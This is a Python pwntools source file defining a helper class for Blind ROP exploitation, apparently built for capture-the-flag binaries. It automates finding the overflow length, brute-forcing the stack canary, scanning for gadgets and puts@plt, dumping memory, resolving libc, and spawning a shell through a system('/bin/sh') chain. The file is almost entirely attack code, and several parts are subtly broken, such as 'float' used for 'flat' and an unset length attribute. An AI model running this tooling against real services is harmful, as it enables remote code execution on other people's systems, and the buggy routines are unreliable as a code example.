from pwn import *
from xiaodot.LibcSearcher.LibcSearcher import *



context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'



class xiao_pwn(process,remote):
    def __init__(self, sh, output, output2, start_addr = 0x400000, osi = 'linux', arch='amd64', log_level='debug'):
        self.sh = sh
        self.start_addr = start_addr
        context.os = osi
        context.arch = arch
        context.log_level = log_level

        self.output = output.encode()
        self.output2 = output2.encode()
        self.dg = 'no'




    def dug(self):
        self.dg = 'yes'




    

    def rv(self,payload):
        try:

            self.sh.sendlineafter(self.output,payload)
            out = self.sh.recv() 
            if not self.dg == 'yes':
                # self.sh.close()

                return out
        except:
            # self.sh.close()
            return  False


    def getbufferflow_length(self):



        


        while True:
            i = 200
            try:
                pattern = cyclic(i)
                out = self.rv(pattern)
                print(out)
                if  not out.startswith(b'Segmentation fault at'):
                    log.success('one success getbufferflow_length: 0x%x' % (i))
                else:
                    i = i*2
            except EOFError:
                log.success('搞不来自己来')
      
            
    def leak_canary(self):
        canary = '\x00'
        while len(canary) < 8:
            for x in range(256):
                payload = 'A' * self.length +canary + chr(x)
                out = self.rv(payload)
                if  out == False:
                    continue
                else:
                    canary += chr(x)
                    break


        log.success('canary: %s' % canary)
        
    def get_stop_addr(self):
        addr = self.start_addr
        while True:
            try:

                payload = flat(['A'* self.length,p64(addr)])

                out = self.rv(payload)

                if not out.startswith(self.output):

                    addr += 1
                else:
                    log.success('one success stop gadget addr: 0x%x' % (addr))
                    return addr
            except Exception:
                addr += 1


    



    def get_brop_gadget(self, stop_gadget, addr):
        try:
            
            payload = flat([b'A' * self.length , p64(addr) , p64(0) * 6,p64(stop_gadget) , p64(0) * 10])
            
            content = self.rv(payload)

            # stop gadget returns memory
            if not content.startswith(self.output):
                return False
            return True
        except Exception:
            return False


    def check_brop_gadget(self, addr):
        try:

            payload = float([b'A' * self.length ,addr , b'A' * 8 * 10])
            content = self.rv(payload)

            return False
        except Exception:

            return True


    def get_puts_addr(self, rdi_ret, stop_gadget):
        addr = self.start_addr
        while True:
            payload = flat([b'A' * self.length ,p64(rdi_ret),p64(0x400000),p64(addr),p64(stop_gadget)])
            try:
                content = self.rv(payload)
                if content.startswith(b'\x7fELF'):
                    log.success('find puts@plt addr: 0x%x' % addr)
                    return addr
       
                addr += 1
            except Exception:

                addr += 1


    def leak(self, rdi_ret, puts_plt, leak_addr, stop_gadget):
        
        payload = flat([b'a' * self.length, p64(rdi_ret), p64(leak_addr), p64(puts_plt), p64(stop_gadget)])
       
        ind =  '\n' + self.output.decode()
        try:
            data = self.rv(payload)
   
            try:
             
                data = data[:data.index(ind.encode())]
                print(data)
                # data = data[:data.index(self.output)].rstrip('\n')
            except Exception:
                data = data
            if data == b"":
                data = b'\x00'
            return data
        except Exception:

            return None



    def putsleakfunction(self, rdi_ret, puts_plt, stop_gadget):
        addr = 0x400000
        result = b""
        while addr < 0x401000:
            data = self.leak( rdi_ret, puts_plt, addr, stop_gadget)
            if data is None:
                continue
            else:
                result += data
                addr += len(data)

        with open('code', 'wb') as f:
            f.write(result)
                






    def find_exp(self,func,rdi_ret,puts_got,puts_plt,stop_gadget):
        
        
        payload = flat(['A' * self.length ,p64(rdi_ret),p64(puts_got),p64(puts_plt),p64(stop_gadget)])
        out =  self.rv(payload)
        ind =  '\n' + self.output.decode()
        data = out[:out.index(ind.encode())]
        addr = u64(data.ljust(8, b'\x00'))
        libc = LibcSearcher(func, addr)
        libc_base = addr - libc.dump(func)
        system_addr = libc_base + libc.dump('system')
        binsh_addr = libc_base + libc.dump('str_bin_sh')
        self.system_addr = system_addr
        self.binsh_addr =  binsh_addr
        
       
        
    def rdi_sysc_bin(self,rdi_ret,stop_gadget):
        sh = self.sh()
        payload = flat([b'A' * self.length, p64(rdi_ret), p64(self.binsh_addr), p64(self.system_addr), p64(stop_gadget)])
        sh.sendline(payload)
        sh.interactive()





    def find_csu_gadget(self, stop_gadget):
        addr = self.start_addr
        while True:
            if self.get_brop_gadget( stop_gadget, addr):
                if self.check_brop_gadget( addr):
                    log.success('one success getbufferflow_length: 0x%x' % (addr))
                    return addr
            addr += 1




globals().update({name: globals()[name] for name in dir() if not name.startswith("_")})